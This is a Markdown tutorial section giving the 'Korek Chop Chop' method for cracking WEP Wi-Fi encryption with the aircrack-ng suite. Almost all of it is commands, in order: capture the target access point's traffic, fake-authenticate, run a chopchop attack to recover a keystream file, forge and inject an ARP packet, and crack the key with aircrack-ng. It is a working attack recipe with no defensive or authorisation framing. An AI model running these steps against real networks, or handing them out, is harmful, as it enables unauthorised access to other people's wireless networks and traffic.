- - -
# Method 2 🐯 ( Korek Chop Chop) : 

#### Run Airodump-ng On Target AP : 

```sh
airodump-ng --bssid AA:AA:AA:AA:AA:AA --channel 69 --write chopchop-test mon0
```

#### Do a Fakeauth : 

```sh
aireplay-ng  --fakeauth 0 -a <Target-MAC> -h <Our-MAC> mon0
```

#### Perform a ChopChop : 

```sh
aireplay-ng  --chopchop -b <Target-MAC> -h <Our-MAC> mon0
>>> y
```

![Imgur](https://i.imgur.com/0L3jqxO.png)

Wait for it to done. Then ; 

####  Run packetforge-ng : 
Against created **.xor** file.

Perform a **fakeauth** again. Then; 

```sh
packetforge-ng -0 -a <Target-MAC> -h <Our-MAC> -k 255.255.255.255 -l 255.255.255.255  -y *.xor -w chopchop-forged-packet
```

#### Now run aireplay-ng : 

Perform a **fakeauth** again. Then;

```sh
aireplay-ng -2 -r chopchop-forged-packet mon0 
>>> y
```

#### Now finally run aircrack-ng : 

```sh
aircrack-ng chopchop-test-01.cap
```

![Imgur](https://i.imgur.com/NiDVgTs.png)


- - -